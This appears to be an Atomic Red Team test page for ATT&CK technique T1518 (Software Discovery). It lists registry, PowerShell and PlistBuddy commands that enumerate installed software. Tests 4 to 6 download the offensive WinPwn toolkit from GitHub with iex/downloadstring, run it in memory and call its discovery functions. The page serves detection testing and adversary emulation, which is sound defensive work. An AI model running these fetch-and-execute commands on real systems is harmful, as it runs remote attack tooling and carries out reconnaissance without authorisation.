---
tags: [T1518, atomic_test]
filename: "[[T1518 - Software Discovery]]"
---
# T1518 - Software Discovery

## Atomic Test #1 - Find and Display Internet Explorer Browser Version
Query the registry to determine the version of internet explorer installed on the system.
Upon execution, version information about internet explorer will be displayed.

**Supported Platforms:** Windows


**auto_generated_guid:** 68981660-6670-47ee-a5fa-7e74806420a4






#### Attack Commands: Run with `command_prompt`! 


```cmd
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer" /v svcVersion
```






<br/>
<br/>

## Atomic Test #2 - Applications Installed
Query the registry to determine software and versions installed on the system. Upon execution a table of
software name and version information will be displayed.

**Supported Platforms:** Windows


**auto_generated_guid:** c49978f6-bd6e-4221-ad2c-9e3e30cc1e3b






#### Attack Commands: Run with `powershell`! 


```powershell
Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize
```






<br/>
<br/>

## Atomic Test #3 - Find and Display Safari Browser Version
Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors

**Supported Platforms:** macOS


**auto_generated_guid:** 103d6533-fd2a-4d08-976a-4a598565280f






#### Attack Commands: Run with `sh`! 


```sh
/usr/libexec/PlistBuddy -c "print :CFBundleShortVersionString" /Applications/Safari.app/Contents/Info.plist
/usr/libexec/PlistBuddy -c "print :CFBundleVersion" /Applications/Safari.app/Contents/Info.plist
```






<br/>
<br/>

## Atomic Test #4 - WinPwn - Dotnetsearch
Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn

**Supported Platforms:** Windows


**auto_generated_guid:** 7e79a1b6-519e-433c-ad55-3ff293667101






#### Attack Commands: Run with `powershell`! 


```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Dotnetsearch -noninteractive -consoleoutput
```






<br/>
<br/>

## Atomic Test #5 - WinPwn - DotNet
Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.

**Supported Platforms:** Windows


**auto_generated_guid:** 10ba02d0-ab76-4f80-940d-451633f24c5b






#### Attack Commands: Run with `powershell`! 


```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
dotnet -consoleoutput -noninteractive
```






<br/>
<br/>

## Atomic Test #6 - WinPwn - powerSQL
Start PowerUpSQL Checks using powerSQL function of WinPwn

**Supported Platforms:** Windows


**auto_generated_guid:** 0bb64470-582a-4155-bde2-d6003a95ed34






#### Attack Commands: Run with `powershell`! 


```powershell
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput
```






<br/>
